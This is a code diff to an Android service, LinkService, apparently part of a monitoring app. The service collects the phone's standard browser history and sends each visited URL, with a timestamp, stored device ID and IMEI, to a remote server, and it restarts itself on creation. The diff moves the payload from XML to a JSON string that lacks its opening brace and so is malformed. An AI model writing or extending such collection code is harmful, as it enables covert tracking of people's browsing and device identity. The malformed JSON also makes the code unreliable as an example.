@@ -19,7 +19,7 @@ import android.provider.Browser;
 import android.util.Log;
 
 import com.inet.android.bs.FileLog;
-import com.inet.android.bs.Request;
+import com.inet.android.bs.RequestMakerImpl;
 import com.inet.android.bs.WorkTimeDefiner;
 
 /** Класс сбора истории стандартного браузера
@@ -35,7 +35,7 @@ public class LinkService extends Service {
 	final String SAVED_TIME = "saved_time";
 	private Context context;
 	private SharedPreferences sp;
-	Request req;
+	RequestMakerImpl req;
 	public void onCreate() {
 		super.onCreate();
 		startService(new Intent(this, LinkService.class));
@@ -151,14 +151,20 @@ public class LinkService extends Service {
 					String urlDateInFormat = formatter.format(calendar.getTime())
 							.toString();
 
-					String sendStr = "<packet><id>" + sp.getString("ID", "ID") 
-							+ "</id><time>" + urlDateInFormat
-							+ "</time><type>4</type><app>"
-							+ "Интернет-браузер</app><url>" + url
-							+ "</url><ntime>" + "30"
-							+ "</ntime></packet>";
-					req = new Request(context);
-					req.sendRequest(sendStr);
+//					String sendStr = "<packet><id>" + sp.getString("ID", "ID") 
+//							+ "</id><time>" + urlDateInFormat
+//							+ "</time><type>4</type><app>"
+//							+ "Интернет-браузер</app><url>" + url
+//							+ "</url><ntime>" + "30"
+//							+ "</ntime></packet>";
+					String sendJSONStr = "\"id\":\"" + sp.getString("ID", "0000") + "\","
+							+ "\"imei\":\"" + sp.getString("IMEI", "0000") + "\","
+							+ "\"time\":\"" + urlDateInFormat + "\","
+							+ "\"type\":\"4\","
+							+ "\"url\":\"" + url + "\","
+							+ "\"duration\":\"" + 30 + "\"}";
+					req = new RequestMakerImpl(context);
+					req.sendDataRequest(sendJSONStr);
 
 					Editor ed = sPref.edit();
 					ed.putString(SAVED_TIME, urlDate);
